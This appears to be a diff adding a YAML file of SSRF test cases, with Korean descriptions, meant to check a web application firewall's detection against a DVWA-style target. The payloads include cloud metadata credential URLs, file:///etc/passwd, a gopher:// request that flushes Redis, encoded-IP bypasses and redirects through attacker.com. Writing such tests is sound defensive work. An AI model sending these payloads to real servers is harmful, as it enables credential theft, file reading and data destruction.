@@ -1,0 +1,218 @@
+# =============================================================================
+# SSRF (Server-Side Request Forgery) Test Cases
+# =============================================================================
+# 내부 네트워크 스캔, 클라우드 메타데이터 접근, 프로토콜 우회 등
+# WAF의 SSRF 탐지 능력을 검증합니다.
+# =============================================================================
+
+category: "ssrf"
+name: "Server-Side Request Forgery"
+description: "SSRF 공격 탐지 테스트"
+severity: "critical"
+icon: "🌐"
+
+tests:
+  # --- 내부 네트워크 스캔 ---
+  - id: "ssrf-001"
+    description: "SSRF - 내부 localhost 80"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://127.0.0.1:80"
+    severity: "critical"
+
+  - id: "ssrf-002"
+    description: "SSRF - 내부 localhost 8080"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://127.0.0.1:8080"
+    severity: "critical"
+
+  - id: "ssrf-003"
+    description: "SSRF - localhost 대체 0.0.0.0"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://0.0.0.0:80"
+    severity: "high"
+
+  - id: "ssrf-004"
+    description: "SSRF - localhost 대체 [::1]"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://[::1]:80"
+    severity: "high"
+
+  - id: "ssrf-005"
+    description: "SSRF - 사설 IP 10.x.x.x"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://10.0.0.1:80"
+    severity: "high"
+
+  - id: "ssrf-006"
+    description: "SSRF - 사설 IP 172.16.x.x"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://172.16.0.1:22"
+    severity: "high"
+
+  - id: "ssrf-007"
+    description: "SSRF - 사설 IP 192.168.x.x"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://192.168.1.1:443"
+    severity: "high"
+
+  - id: "ssrf-008"
+    description: "SSRF - 내부 IP 우회 (8진수)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://0177.0.0.1:80"
+    severity: "medium"
+
+  - id: "ssrf-009"
+    description: "SSRF - 내부 IP 우회 (정수)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://2130706433:80"
+    severity: "medium"
+
+  - id: "ssrf-010"
+    description: "SSRF - 내부 IP 우회 (16진수)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://0x7f000001:80"
+    severity: "medium"
+
+  # --- 클라우드 메타데이터 ---
+  - id: "ssrf-011"
+    description: "SSRF - AWS 메타데이터 IMDSv1"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://169.254.169.254/latest/meta-data/"
+    severity: "critical"
+
+  - id: "ssrf-012"
+    description: "SSRF - AWS 메타데이터 IMDSv2"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    severity: "critical"
+
+  - id: "ssrf-013"
+    description: "SSRF - GCP 메타데이터"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://metadata.google.internal/computeMetadata/v1/"
+    severity: "critical"
+
+  - id: "ssrf-014"
+    description: "SSRF - Azure 메타데이터"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    severity: "critical"
+
+  - id: "ssrf-015"
+    description: "SSRF - Alibaba Cloud 메타데이터"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://100.100.100.200/latest/meta-data/"
+    severity: "high"
+
+  # --- 프로토콜 스키마 우회 ---
+  - id: "ssrf-016"
+    description: "SSRF - file:// 프로토콜"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "file:///etc/passwd"
+    severity: "critical"
+
+  - id: "ssrf-017"
+    description: "SSRF - dict:// 프로토콜"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "dict://localhost:6379/info"
+    severity: "high"
+
+  - id: "ssrf-018"
+    description: "SSRF - gopher:// 프로토콜 (Redis 공격)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "gopher://localhost:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a"
+    severity: "critical"
+
+  - id: "ssrf-019"
+    description: "SSRF - ftp:// 프로토콜"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "ftp://attacker.com:21/"
+    severity: "high"
+
+  # --- DNS 리바인딩 / 우회 ---
+  - id: "ssrf-020"
+    description: "SSRF - DNS 리바인딩 (1e100.net)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://1e100.net/"
+    severity: "medium"
+
+  - id: "ssrf-021"
+    description: "SSRF - 짧은 URL 우회"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://0x7f.1/"
+    severity: "medium"
+
+  - id: "ssrf-022"
+    description: "SSRF - 리다이렉트 우회 (HTTP->내부)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://attacker.com/redirect?target=http://127.0.0.1:80"
+    severity: "high"
+
+  # --- 내부 포트 스캔 ---
+  - id: "ssrf-023"
+    description: "SSRF - 내부 Redis 6379"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://127.0.0.1:6379"
+    severity: "high"
+
+  - id: "ssrf-024"
+    description: "SSRF - 내부 MySQL 3306"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://127.0.0.1:3306"
+    severity: "high"
+
+  - id: "ssrf-025"
+    description: "SSRF - 내부 Elasticsearch 9200"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "http://127.0.0.1:9200"
+    severity: "high"
